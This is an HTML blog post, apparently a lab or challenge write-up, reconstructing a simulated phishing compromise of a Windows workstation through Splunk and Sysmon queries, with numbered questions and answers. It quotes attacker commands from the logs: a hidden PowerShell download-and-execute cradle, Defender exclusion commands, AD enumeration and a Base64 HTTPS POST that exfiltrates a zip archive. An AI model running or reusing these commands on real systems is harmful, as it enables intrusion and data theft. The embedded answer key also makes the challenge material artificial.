@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>GhostConnect (TA583) — Full Threat Hunt in Splunk — cuddest</title>
+<meta name="description" content="GhostConnect (TA583) — Full Threat Hunt in Splunk">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/writeups.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="topbar-in">
+    <a class="logo" href="../index.html#writing" aria-label="cuddest — back to writeups">
+      <svg class="logo-mark" viewBox="0 0 24 24" aria-hidden="true">
+        <rect x="1.6" y="1.6" width="20.8" height="20.8" rx="2"
+              fill="none" stroke="currentColor" stroke-width="1.5"/>
+        <path d="M15.6 8.9a4.2 4.2 0 1 0 0 6.2" fill="none"
+              stroke="var(--logo-accent)" stroke-width="1.9" stroke-linecap="round"/>
+      </svg>
+      <span class="logo-word">uddest</span>
+    </a>
+    <span class="topbar-cta"><a class="ulink" href="../index.html#writing">← All writeups</a></span>
+  </div>
+</header>
+
+<article class="wpost">
+  <header class="wpost-head">
+    <p class="wpost-meta"><span>2026-08-18</span><span>25 min read</span></p>
+    <h1>GhostConnect (TA583) — Full Threat Hunt in Splunk</h1>
+  </header>
+  <div class="wpost-body">
+<h2>1. Investigation Objective</h2>
+<p>The investigation focused on the Windows workstation <code>FB-WKS64</code> after suspicious activity indicated that a user account had been compromised.</p>
+<p>The objective was to reconstruct the attack from initial access through execution, command-and-control activity, defense evasion, data collection, and exfiltration.</p>
+<p>The investigation was conducted primarily in <strong>Splunk</strong>, using Windows and Sysmon telemetry.</p>
+<p>The host investigated throughout the hunt was:</p>
+<pre><code class="language-text">FB-WKS64
+</code></pre>
+<p>The account ultimately identified as the compromised/executing account was:</p>
+<pre><code class="language-text">FEDBRIDGE\chriskarma
+</code></pre>
+<p>The overall attack chain was reconstructed as:</p>
+<pre><code class="language-text">Malicious email / web delivery
+        ↓
+Chrome
+        ↓
+E-INVITE.vbs
+        ↓
+wscript.exe
+        ↓
+PowerShell
+        ↓
+Google Drive payload delivery
+        ↓
+PowerShell payload execution
+        ↓
+Defender exclusions
+        ↓
+C2 / additional payload from 34.228.194.206
+        ↓
+Archive creation
+        ↓
+HTTPS exfiltration to 52.59.253.168
+</code></pre>
+<hr />
+<h1>2. Initial Splunk Reconnaissance</h1>
+<p>The first attempt was to search broadly for email/phishing-related activity:</p>
+<pre><code class="language-spl">index=* host=&quot;FB-WKS64&quot;
+| search email OR outlook OR phishing OR url OR attachment
+| table _time User sender recipient subject url attachment
+</code></pre>
+<p>This returned approximately <strong>19,137 events</strong>.</p>
+<p>However, this did <strong>not</strong> mean the workstation had 19,137 email-related events.</p>
+<p>The problem was the very broad:</p>
+<pre><code class="language-spl">| search email OR outlook OR phishing OR url OR attachment
+</code></pre>
+<p>This searches event contents and can match common words appearing in completely unrelated Windows logs.</p>
+<p>Also, this command:</p>
+<pre><code class="language-spl">| table _time User sender recipient subject url attachment
+</code></pre>
+<p>does not create those fields. If the source event doesn't contain <code>sender</code>, <code>recipient</code>, <code>subject</code>, etc., Splunk simply displays them as empty.</p>
+<hr />
+<h1>3. Identifying the Relevant Telemetry</h1>
+<p>We then checked which sourcetypes contained the matches:</p>
+<pre><code class="language-spl">index=* host=&quot;FB-WKS64&quot;
+| search email OR outlook OR phishing OR attachment
+| stats count by sourcetype
+| sort - count
+</code></pre>
+<p>A large amount of the resulting data came from:</p>
+<pre><code class="language-text">xmlwineventlog
+</code></pre>
+<p>A similar problem occurred when attempting to locate Defender events with:</p>
+<pre><code class="language-spl">index=* host=&quot;FB-WKS64&quot;
+| search Defender OR &quot;Windows Defender&quot; OR antivirus OR malware OR threat OR detection
+| stats count by sourcetype
+</code></pre>
+<p>Again, most of the results were coming from the generic <code>xmlwineventlog</code> sourcetype.</p>
+<p>This established that keyword searching alone was insufficient; we needed to inspect actual <strong>Windows Event IDs</strong> and their associated telemetry.</p>
+<hr />
+<h1>4. Pivoting to Sysmon Process Creation</h1>
+<p>The dataset contained Sysmon telemetry under the <code>xmlwineventlog</code> sourcetype.</p>
+<p>Sysmon Event ID <strong>1</strong> was especially important because it records process creation.</p>
+<p>We searched for PowerShell activity:</p>
+<pre><code class="language-spl">index=* host=&quot;FB-WKS64&quot; sourcetype=&quot;xmlwineventlog&quot; EventCode=1
+| search Image=&quot;*powershell*&quot; OR CommandLine=&quot;*powershell*&quot;
+| table _time User Image ParentImage CommandLine
+| sort _time
+</code></pre>
+<p>This immediately reduced the noise and gave us:</p>
+<ul>
+<li>timestamp</li>
+<li>user</li>
+<li>process image</li>
+<li>parent process</li>
+<li>command line</li>
+</ul>
+<p>This was the turning point because the process tree and command lines exposed the actual execution chain.</p>
+<hr />
+<h1>5. Identifying the Compromised Account</h1>
+<p>The suspicious PowerShell cluster was associated with:</p>
+<pre><code class="language-text">FEDBRIDGE\chriskarma
+</code></pre>
+<p>An especially important event occurred on:</p>
+<pre><code class="language-text">2026-04-21 13:38:53
+</code></pre>
+<p>The process was:</p>
+<pre><code class="language-text">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</code></pre>
+<p>Its parent process was:</p>
+<pre><code class="language-text">C:\Windows\System32\wscript.exe
+</code></pre>
+<p>and it executed:</p>
+<pre><code class="language-text">C:\Users\CHRISK~1\AppData\Local\Temp\gdrive_download_93330ba7.ps1
+</code></pre>
+<p>So the process relationship was:</p>
+<pre><code class="language-text">wscript.exe
+    ↓
+powershell.exe
+    ↓
+gdrive_download_93330ba7.ps1
+</code></pre>
+<p>under:</p>
+<pre><code class="language-text">FEDBRIDGE\chriskarma
+</code></pre>
+<ol>
+<li>The compromise began on a workstation when a user launched the email client on FB-WKS64. What is the username of the compromised account</li>
+</ol>
+<div class="answer">** chriskarma</div>
+
+<hr />
+<h1>6. Discovering the Initial VBS Execution</h1>
+<p>Further investigation revealed that Chrome had downloaded:</p>
+<pre><code class="language-text">E-INVITE.vbs
+</code></pre>
+<p>The sequence was:</p>
+<pre><code class="language-text">13:38:44
+Chrome downloads E-INVITE.vbs
+</code></pre>
+<p>followed by:</p>
+<pre><code class="language-text">13:38:52
+Explorer launches WScript with E-INVITE.vbs
+</code></pre>
+<p>which executed:</p>
+<pre><code class="language-text">C:\Users\chriskarma\Downloads\E-INVITE.vbs
+</code></pre>
+<p>At essentially the same time:</p>
+<pre><code class="language-text">13:38:52
+WScript creates:
+C:\Users\CHRISK~1\AppData\Local\Temp\gdrive_download_93330ba7.ps1
+</code></pre>
+<p>and:</p>
+<pre><code class="language-text">13:38:53
+PowerShell executes the PS1
+</code></pre>
+<p>This produced a coherent execution chain in which the VBS file led directly to WScript, the downloader, and PowerShell execution.</p>
+<hr />
+<h1>7. Internet Origin of the Malicious VBS</h1>
+<p>Sysmon also recorded the file's <code>Zone.Identifier</code> alternate data stream:</p>
+<pre><code class="language-text">C:\Users\chriskarma\Downloads\E-INVITE.vbs:Zone.Identifier
+</code></pre>
+<p>This is useful forensic evidence because it indicates Windows treated the file as Internet-originated.</p>
+<p>The important observation was therefore:</p>
+<pre><code class="language-text">Chrome
+  ↓
+E-INVITE.vbs
+  ↓
+Zone.Identifier
+  ↓
+WScript execution
+</code></pre>
+<p>This strongly supports the initial malicious file having come from an Internet download.</p>
+<h3>Email Link → Browser Delivery Page:</h3>
+<p>The investigation established that the victim interacted with a link delivered through the phishing email, which caused a browser to open the attacker-controlled delivery page.</p>
+<p>The full URL of the delivery page was:</p>
+<p>http://52.59.253.168/download_invitee.php</p>
+<ol start="2">
+<li>The user clicked a link inside the email, which spawned a browser. What is the full URL of the delivery page the victim was directed to?</li>
+</ol>
+<div class="answer">**  http://52.59.253.168/download_invitee.php</div>
+
+<ol start="3">
+<li>he lure page automatically downloaded a malicious script to the host. What is the full source URL it was originally downloaded from?</li>
+</ol>
+<div class="answer">**:  http://52.59.253.168/E-INVITE.vbs</div>
+
+<p>After that i went to find what child processes  the wscript spawned:</p>
+<p><code>index=* host="FB-WKS64" sourcetype="xmlwineventlog" EventCode=1 ParentImage="*\\wscript.exe"</code><br />
+<code>| table _time, Image, CommandLine</code><br />
+<code>| sort + _time</code></p>
+<p>The results were decessive:<br />
+- <strong><code>powershell.exe</code></strong>: This process was executed first on 4/21/26 at 1:38:53.000 PM. The command line indicates it was used to execute the <code>gdrive_download_93330ba7.ps1</code> script.</p>
+<ul>
+<li><strong><code>chrome.exe</code></strong>: This process was executed shortly after on 4/21/26 at 1:39:04.000 PM. The command line shows it was launched with a Google Drive URL to initiate a download.</li>
+</ul>
+<ol start="4">
+<li>Once executed, the dropped script orchestrated the next stage by spawning multiple child processes within seconds. List the two children of wscript.exe in chronological order.</li>
+</ol>
+<div class="answer">** powershell.exe, chrome.exe</div>
+
+<p>After the initial delivery page, the next-stage payload was retrieved through a legitimate cloud-hosting service, <strong>Google Drive</strong>.</p>
+<p><code>index=* host="FB-WKS64" sourcetype="xmlwineventlog" EventCode=1</code><br />
+<code>| search Image="*chrome.exe*" OR CommandLine="*drive.google.com*"</code><br />
+<code>| table _time User Image ParentImage CommandLine</code><br />
+<code>| sort _time</code></p>
+<p>The relevant event contained:</p>
+<p><code>"C:\Program Files\Google\Chrome\Application\chrome.exe"</code></p>
+<p><code>--single-argument</code></p>
+<p><code>https://drive.google.com/uc?export=download&amp;id=1Yqzl-L-1FGWm4iOwieRFv9zr0urEEGWR</code></p>
+<ol start="5">
+<li>The next-stage payload was retrieved from a legitimate cloud-hosting service. What is the file ID embedded in that download URL?</li>
+</ol>
+<div class="answer">** 1Yqzl-L-1FGWm4iOwieRFv9zr0urEEGWR</div>
+
+<p>After extracting the second stage archive the user double clicked the loader executable, so my search went:</p>
+<p><code>index=* host="FB-WKS64" sourcetype="xmlwineventlog" EventCode=1</code> <br />
+<code>ParentImage="*\\explorer.exe" Image="C:\\Users\\chriskarma\\*.exe"</code><br />
+<code>| table _time, Image, ParentImage, CommandLine</code><br />
+<code>| sort + _time</code></p>
+<p>The full file path of the loader executable is:</p>
+<p><strong><code>C:\Users\chriskarma\Downloads\FileServer\FileServer.exe, the timeline fits perfectly:</code></strong></p>
+<ul>
+<li>
+<p><strong>13:39:04</strong>: The archive is downloaded from Google Drive.</p>
+</li>
+<li>
+<p><strong>13:40:15</strong>: The user double-clicks the extracted <code>FileServer.exe</code> file. We know it was manually executed (double-clicked) by the user because its parent process is <code>C:\Windows\explorer.exe</code> (Windows Explorer), and it is located inside a newly created <code>FileServer</code> folder within the <code>Downloads</code> directory, which indicates it was just extracted from an archive.</p>
+</li>
+</ul>
+<ol start="6">
+<li>After extracting the second-stage archive, the user double-clicked the loader executable. What is the full file path of the first-stage loader?</li>
+</ol>
+<div class="answer">**:  C:\Users\chriskarma\Downloads\FileServer\FileServer.exe</div>
+
+<p>When a loader like <code>FileServer.exe</code> establishes a foothold, its next logical step is usually to run automated "discovery commands" to figure out what kind of machine it just infected, what privileges it has, and what network it is on.</p>
+<p>To find exactly what it did, we need to search for any new processes (Event ID 1) where <strong><code>FileServer.exe</code></strong> was the parent process.</p>
+<p><code>index=* host="FB-WKS64" sourcetype="xmlwineventlog" EventCode=1 ParentImage="*\\FileServer.exe"</code><br />
+<code>| table _time, Image, CommandLine</code><br />
+<code>| sort + _time</code></p>
+<p>Based on the results the attacker ran a lot of discovery commands:<br />
+Based on the command line arguments in the log, the scheduled task command is:</p>
+<ul>
+<li>
+<p><strong>Time:</strong> <code>2026-04-21 15:18:17</code></p>
+</li>
+<li>
+<p><strong>Image:</strong> <code>C:\Windows\System32\schtasks.exe</code></p>
+</li>
+<li>
+<p><strong>CommandLine:</strong> <code>"schtasks" /query /tn vulntask /fo list /v</code></p>
+</li>
+<li>
+<p>vulntask`: was the task name being targeted </p>
+</li>
+</ul>
+<ol start="7">
+<li>Among the loader's discovery commands, one queried a specific scheduled task by name, likely an OPSEC check to verify a prior footprint. What task name was queried?</li>
+</ol>
+<div class="answer">** vulntask</div>
+
+<p>Also the results contained :</p>
+<p><code>2026-04-21 15:20:23C:\Windows\System32\icacls.exe"icacls" c:\tasks\schtask.bat2026-04-21 15:28:47C:\Windows\System32\net.exe"net" share2026-04-21 15:33:50C:\Windows\System32\ROUTE.EXE"route" print2026-04-21 15:34:24C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Add-MpPreference -ExclusionExtension .exe -Force2026-04-21 15:34:54C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Add-MpPreference -ExclusionPath C:\Temp -Force2026-04-21 15:41:37C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Add-MpPreference -ExclusionPath C:\Windows\Temp -Force2026-04-21 15:47:31C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"powershell.exe" -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://34.228.194.206:80/f'))"</code></p>
+<p>This batch of logs captures the critical transition from <strong>reconnaissance</strong> to <strong>defense evasion, persistence preparation, and payload downloading</strong>.<br />
+Which contained a  Check for  File Permissions (<code>icacls</code>)</p>
+<ul>
+<li>
+<p><strong>Command:</strong> <code>"icacls" c:\tasks\schtask.bat</code></p>
+</li>
+<li>
+<p><strong>What it means:</strong> The attacker is checking or modifying the Access Control Lists (ACLs) on a script (<code>schtask.bat</code>) located in a tasks directory to ensure it has the correct permissions to execute properly (often ensuring users or SYSTEM can run it without access denied errors).</p>
+</li>
+</ul>
+<ol start="8">
+<li>The loader inspected the ACL on a single file, suggesting preparation for a hijack or overwrite. What is the full path of that file?</li>
+</ol>
+<div class="answer">** c:\tasks\schtask.bat</div>
+
+<p>also part of the checks he did contained this:</p>
+<p>c<code>md" /c "echo AF.exe -f (objectcategory=computer) &amp;gt; computers.txt &amp;gt; C:\Windows\Temp\2026-04-21 15:00:38C:\Windows\System32\cmd.exe"cmd" /c "echo AF.exe -f (objectcategory=computer) &amp;gt; computers.txt &amp;gt; C:\Windows\Temp\adf.bat"2026-04-21 15:02:12C:\Windows\System32\cmd.exe"cmd" /c "echo AF.exe -f (objectcategory=person) &amp;gt; users.txt &amp;gt;&amp;gt; C:\Windows\Temp\adf.bat"2026-04-21 15:03:43C:\Windows\System32\cmd.exe"cmd" /c "echo AF.exe -f (objectcategory=organizationalUnit) &amp;gt; ous.txt &amp;gt;&amp;gt; C:\Windows\Temp\adf.bat"2026-04-21 15:04:13C:\Windows\System32\cmd.exe"cmd" /c "echo AF.exe -f (objectcategory=group) &amp;gt; groups.txt &amp;gt;&amp;gt; C:\Windows\Temp\adf.bat"2026-04-21 15:04:44C:\Windows\System32\cmd.exe"cmd" /c "cd C:\Windows\Temp"2026-04-21 15:09:15C:\Windows\System32\cmd.exe"cmd" /c "echo AF.exe -f (objectcategory=computer) &amp;gt; computers.txt &amp;gt; C:\Users\chriskarma\AppData\Roaming\adf.bat"2026-04-21 15:12:48C:\Windows\System32\cmd.exe"cmd" /c "echo AF.exe -f (objectcategory=person) &amp;gt; users.txt &amp;gt;&amp;gt; C:\Users\chriskarma\AppData\Roaming\adf.bat"2026-04-21 15:13:19C:\Windows\System32\cmd.exe"cmd" /c "echo AF.exe -f (objectcategory=organizationalUnit) &amp;gt; ous.txt &amp;gt;&amp;gt; C:\Users\chriskarma\AppData\Roaming\adf.bat"2026-04-21 15:13:50C:\Windows\System32\cmd.exe"cmd" /c "echo AF.exe -f (objectcategory=group) &amp;gt; groups.txt &amp;gt;&amp;gt; C:\Users\chriskarma\AppData\Roaming\adf.bat"2026-04-21 15:15:55C:\Windows\System32\NETSTAT.EXE"netstat" -abno2026-04-21 15:18:17C:\Windows\System32\schtasks.exe"schtasks" /query /tn vulntask /fo list /v</code></p>
+<p><strong>What is it doing step-by-step?</strong></p>
+<ol>
+<li>
+<p><strong>Building the Batch Script (<code>adf.bat</code>):</strong></p>
+<p>Instead of dropping a pre-compiled tool or script onto the machine all at once, the commands use <code>echo</code> to write lines into a batch script (<code>adf.bat</code>) stored first in <code>C:\Windows\Temp\</code> and later in <code>C:\Users\chriskarma\AppData\Roaming\</code>.</p>
+</li>
+<li>
+<p><strong>Querying Active Directory Objects:</strong></p>
+<p>The commands inside <code>adf.bat</code> use a utility named <strong><code>AF.exe</code></strong> (which stands for Active Directory Finder / a custom LDAP query tool) with filters (<code>-f</code>) to query the domain database for critical infrastructure details:</p>
+<ul>
+<li>
+<p><code>(objectcategory=computer)</code> $\rightarrow$ Dumps a list of all domain computers into <code>computers.txt</code>.</p>
+</li>
+<li>
+<p><code>(objectcategory=person)</code> $\rightarrow$ Dumps a list of all domain users/accounts into <code>users.txt</code>.</p>
+</li>
+<li>
+<p><code>(objectcategory=organizationalUnit)</code> $\rightarrow$ Dumps the domain Organizational Units (OUs) into <code>ous.txt</code>.</p>
+</li>
+<li>
+<p><code>(objectcategory=group)</code> $\rightarrow$ Dumps domain security and distribution groups into <code>groups.txt</code>.</p>
+</li>
+</ul>
+</li>
+<li>
+<p>AD enumeration was performed via a wrapper script that was iteratively re-staged in two different filesystem locations during the operation. List both full paths of adf.bat in the order they appeared.</p>
+</li>
+</ol>
+<div class="answer">** C:\Windows\Temp\adf.bat, C:\Users\chriskarma\AppData\Roaming\adf.bat</div>
+
+<ol start="10">
+<li>The wrapper script queried four distinct Active Directory object types using LDAP objectcategory filters. List the four objectcategory values in the order the assembly commands ran.</li>
+</ol>
+<div class="answer">**  computer, person, organizationalUnit, group</div>
+
+<p>looking also at thiese juicy results  we have in his  discovery commands journey:</p>
+<p>Right in the middle of those logs, before the script started constructing the <code>adf.bat</code> reconnaissance files and querying the scheduled task, there was a specific process execution event:</p>
+<ul>
+<li>
+<p><strong>Time:</strong> <code>2026-04-21 14:52:52</code></p>
+</li>
+<li>
+<p><strong>Image / File Path:</strong> <code>C:\Users\chriskarma\AppData\Local\FileR.exe</code></p>
+</li>
+<li>
+<p><strong>Parent Process:</strong> Windows Explorer (<code>C:\Windows\explorer.exe</code>)</p>
+</li>
+</ul>
+<ol start="11">
+<li>After execution, the first-stage loader retrieved and ran a second-stage implant. What is the full file path where it was written to disk?</li>
+</ol>
+<div class="answer">** C:\Users\chriskarma\AppData\Local\FileR.exe</div>
+
+<p>To find the sha256 hash of the file <strong>FileR.exe</strong> , we use the fact that Sysmon (Event ID 1) automatically records cryptographic hashes of every executed image, you already have it captured in the event data.</p>
+<p><code>index=* host="FB-WKS64" sourcetype="xmlwineventlog" EventCode=1 Image="*\\FileR.exe"</code><br />
+<code>| table _time, Image, Hashes</code></p>
+<ol start="12">
+<li>What is the SHA256 hash of the second-stage loader?</li>
+</ol>
+<div class="answer">** 8bab731ac2f7d015b81c2002f518fff06ea751a34a711907e80e98cf70b557db</div>
+
+<p>then i went to get more infors on <strong>VirusTotal</strong> about this file searching using the hash, and i was able to find the malware family name and its first seen date.</p>
+<ol start="13">
+<li>Threat intel links the second-stage loader to a known malware family. What is the family name and its first-seen-in-the-wild date?</li>
+</ol>
+<div class="answer">** SilentConnect, 2026-03-10 18:48:19</div>
+
+<p><code>FileR.exe</code> executes the PowerShell cradle (<code>powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('[http://34.228.194.206:80/f](http://34.228.194.206:80/f)'))"</code>), which pulls down the operator's script containing that flaw.</p>
+<pre><code class="language-text">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://34.228.194.206:80/f'))&quot;
+</code></pre>
+<ol start="14">
+<li>One of loaders retrieved an additional payload from a secondary C2 server distinct from the delivery infrastructure. What is the complete URL being fetched?</li>
+</ol>
+<div class="answer">** http://34.228.194.206:80/f</div>
+
+<ol start="15">
+<li>A Python reverse shell to the primary C2 reveals the operator's source template, the script ends by spawning a non-native shell binary that wouldn't even resolve on Windows. What is the path of the shell binary in the subprocess.call list?</li>
+</ol>
+<div class="answer">**  /bin/sh</div>
+
+<p>To find the exact UTC timestamp when an MSI persistence installer was first written to disk in the user's <code>Downloads</code> folder, we can query:</p>
+<p><code>index=* host="FB-WKS64" sourcetype="xmlwineventlog" EventCode=11 TargetFilename="*\\Downloads\\*.msi"</code><br />
+<code>| table UtcTime, Image, TargetFilename</code><br />
+<code>| sort + UtcTime</code></p>
+<p><img alt="img" src="images/Pasted image 20260818032944.png" /></p>
+<ol start="16">
+<li>A persistence installer was dropped to the victim's Downloads folder well before the user was induced to execute it. What is the UTC timestamp when this MSI file was first written to disk?</li>
+</ol>
+<div class="answer">**  2026-04-21 16:33</div>
+
+<p>Next ,the focused query to find the compressed file  was:</p>
+<pre><code class="language-spl">index=* host=&quot;FB-WKS64&quot; sourcetype=&quot;xmlwineventlog&quot; EventCode=1
+| search CommandLine=&quot;*Compress-Archive*&quot;
+| table _time User Image ParentImage CommandLine
+| sort _time
+</code></pre>
+<p>The investigation eventually reached the clearest evidence of data theft.</p>
+<p>At:</p>
+<pre><code>2026-04-21 16:29:43
+</code></pre>
+<p>PowerShell executed:</p>
+<pre><code>Compress-Archive \
+-Path @('C:\Users\jdoe\Documents','C:\Users\jdoe\Desktop') \
+-DestinationPath 'C:\Windows\Temp\~sys_upd.zip' -Force
+</code></pre>
+<p>A second execution occurred at:</p>
+<pre><code>2026-04-21 16:30:26
+</code></pre>
+<ol start="17">
+<li>The operator's first attempt to archive user data referenced source paths that don't exist on this host,  a clear sign of script-template reuse from a previous engagement. What username appears in those non-existent paths?</li>
+</ol>
+<div class="answer">** jdoe</div>
+
+<ol start="18">
+<li>Before exfiltrating data, the attacker staged the victim's files by compressing two directories into a single archive. What is the full file path of the archive created during this staging step?</li>
+</ol>
+<div class="answer">** C:\Windows\Temp\~sys_upd.zip</div>
+
+<p>Then came the last question:</p>
+<ol start="19">
+<li>The operator's PowerShell pipeline transformed the staged archive's bytes into a transmission-safe encoding before POSTing them out over HTTPS. What's the encoding scheme used and the full destination URL?</li>
+</ol>
+<hr />
+<p>Approximately at:</p>
+<pre><code class="language-text">2026-04-21 16:31:29
+</code></pre>
+<p>the operator accessed the archive:</p>
+<pre><code class="language-powershell">$bytes = [System.IO.File]::ReadAllBytes('C:\Windows\Temp\~sys_upd.zip')
+</code></pre>
+<p>then Base64-encoded it:</p>
+<pre><code class="language-powershell">$b64 = [Convert]::ToBase64String($bytes)
+</code></pre>
+<p>and finally transmitted it with:</p>
+<pre><code class="language-powershell">Invoke-WebRequest
+</code></pre>
+<p>to:</p>
+<pre><code class="language-text">https://52.59.253.168/upload
+</code></pre>
+<p>using:</p>
+<pre><code class="language-text">POST
+Content-Type: text/plain
+</code></pre>
+<p>The effective command was:</p>
+<pre><code class="language-powershell">$bytes = [System.IO.File]::ReadAllBytes('C:\Windows\Temp\~sys_upd.zip')
+$b64 = [Convert]::ToBase64String($bytes)
+Invoke-WebRequest `
+    -Uri 'https://52.59.253.168/upload' `
+    -Method POST `
+    -Body $b64 `
+    -ContentType 'text/plain' `
+    -UseBasicParsing
+</code></pre>
+<p>This directly demonstrates:</p>
+<pre><code class="language-text">Sensitive files
+     ↓
+ZIP archive
+     ↓
+Base64 encoding
+     ↓
+HTTPS POST
+     ↓
+52.59.253.168/upload
+</code></pre>
+<p>Executes the retrieved content.</p>
+<div class="answer">**: Base64, https://52.59.253.168/upload</div>
+
+<p>The investigation successfully reconstructed the attack chain on <code>FB-WKS64</code> from the initial phishing delivery through execution, reconnaissance, defense evasion, payload deployment, staging, and final data exfiltration.</p>
+<p>The compromised account was identified as:</p>
+<pre><code class="language-text">FEDBRIDGE\chriskarma
+</code></pre>
+<p>The attack began when the victim followed a malicious link delivered through email, leading to:</p>
+<pre><code class="language-text">http://52.59.253.168/download_invitee.php
+</code></pre>
+<p>The delivery page caused the malicious VBS file to be downloaded from:</p>
+<pre><code class="language-text">http://52.59.253.168/E-INVITE.vbs
+</code></pre>
+<p>The downloaded <code>E-INVITE.vbs</code> was then executed through <code>wscript.exe</code>, which spawned:</p>
+<pre><code class="language-text">powershell.exe
+chrome.exe
+</code></pre>
+<p>The PowerShell stage subsequently launched Chrome toward a Google Drive download URL containing the file ID:</p>
+<pre><code class="language-text">1Yqzl-L-1FGWm4iOwieRFv9zr0urEEGWR
+</code></pre>
+<p>The downloaded archive led to the execution of:</p>
+<pre><code class="language-text">C:\Users\chriskarma\Downloads\FileServer\FileServer.exe
+</code></pre>
+<p>From there, the first-stage loader performed extensive host and Active Directory reconnaissance, including queries against computers, users, organizational units, and groups. It also inspected the permissions of:</p>
+<pre><code class="language-text">c:\tasks\schtask.bat
+</code></pre>
+<p>and checked the scheduled task:</p>
+<pre><code class="language-text">vulntask
+</code></pre>
+<p>The investigation then identified a second-stage implant written to:</p>
+<pre><code class="language-text">C:\Users\chriskarma\AppData\Local\FileR.exe
+</code></pre>
+<p>with SHA256:</p>
+<pre><code class="language-text">8bab731ac2f7d015b81c2002f518fff06ea751a34a711907e80e98cf70b557db
+</code></pre>
+<p>Threat intelligence associated this implant with the <strong>SilentConnect</strong> malware family, first seen in the wild on:</p>
+<pre><code class="language-text">2026-03-10 18:48:19
+</code></pre>
+<p>The implant subsequently retrieved additional operator-controlled code from:</p>
+<pre><code class="language-text">http://34.228.194.206:80/f
+</code></pre>
+<p>The recovered Python reverse-shell code also revealed:</p>
+<pre><code class="language-text">/bin/sh
+</code></pre>
+<p>as the shell binary supplied to <code>subprocess.call</code>, providing an additional indicator of the attacker's command-execution template.</p>
+<p>The attacker then moved into defense evasion and persistence preparation. Windows Defender exclusions were added for <code>.exe</code>, <code>C:\Temp</code>, and <code>C:\Windows\Temp</code>, while additional tooling and an MSI persistence component were introduced onto the host.</p>
+<p>Data collection followed shortly afterward. The attacker initially attempted to archive:</p>
+<pre><code class="language-text">C:\Users\jdoe\Documents
+C:\Users\jdoe\Desktop
+</code></pre>
+<p>which exposed reuse of an operator script template from another environment. The actual victim data was then staged into:</p>
+<pre><code class="language-text">C:\Windows\Temp\~sys_upd.zip
+</code></pre>
+<p>Finally, the attacker read the archive into memory, transformed its contents using <strong>Base64 encoding</strong>, and transmitted the resulting data via an HTTPS POST request to:</p>
+<pre><code class="language-text">https://52.59.253.168/upload
+</code></pre>
+<p>The final exfiltration sequence was therefore:</p>
+<pre><code class="language-text">Victim Documents/Desktop
+        ↓
+~sys_upd.zip
+        ↓
+ReadAllBytes()
+        ↓
+Base64 encoding
+        ↓
+HTTPS POST
+        ↓
+https://52.59.253.168/upload
+</code></pre>
+<h2>Final Attack Chain</h2>
+<p>The complete incident can therefore be summarized as:</p>
+<pre><code class="language-text">Phishing Email
+      ↓
+Malicious Link
+      ↓
+52.59.253.168/download_invitee.php
+      ↓
+E-INVITE.vbs
+      ↓
+wscript.exe
+      ↓
+PowerShell
+      ↓
+Google Drive
+      ↓
+FileServer.exe
+      ↓
+System / AD Reconnaissance
+      ↓
+SilentConnect / FileR.exe
+      ↓
+34.228.194.206:80/f
+      ↓
+Defense Evasion
+      ↓
+Persistence / Additional Payloads
+      ↓
+Data Collection
+      ↓
+~sys_upd.zip
+      ↓
+Base64
+      ↓
+HTTPS POST
+      ↓
+52.59.253.168/upload
+</code></pre>
+<p>This investigation demonstrates how a seemingly simple phishing event can develop into a multi-stage compromise involving script execution, cloud-hosted payload delivery, endpoint reconnaissance, Active Directory enumeration, defense evasion, secondary payload deployment, persistence, data staging, and exfiltration.</p>
+<p>The most important lesson from the hunt was that <strong>individual events were insufficient on their own</strong>. The compromise became clear only after correlating process creation, parent-child relationships, DNS, network connections, file creation, PowerShell command lines, and threat-intelligence information across the timeline.</p>
+<p>The final evidence forms a consistent attack narrative rather than a collection of isolated suspicious events:</p>
+<pre><code class="language-text">Initial Access
+    ↓
+Execution
+    ↓
+Reconnaissance
+    ↓
+Defense Evasion
+    ↓
+Payload Deployment
+    ↓
+Collection
+    ↓
+Exfiltration
+</code></pre>
+<p>The investigation therefore successfully moved from an initially noisy Splunk dataset to a complete, evidence-driven reconstruction of the compromise on <code>FB-WKS64</code>, identifying the affected account, delivery infrastructure, payloads, attacker infrastructure, staging location, and final exfiltration mechanism.</p>
+<p>With love, cuddest.</p>
+  </div>
+  <footer class="wpost-foot">
+    <a class="btn-line" href="../index.html#writing">← Back to all writeups</a>
+  </footer>
+</article>
+
+<footer class="colophon">
+  <div class="wrap colophon-in">
+    <span>© 2026 Ayoub Touati</span>
+    <span>Set in Geist &amp; JetBrains Mono</span>
+    <span><a class="ulink" href="../index.html#writing">Back to the site</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
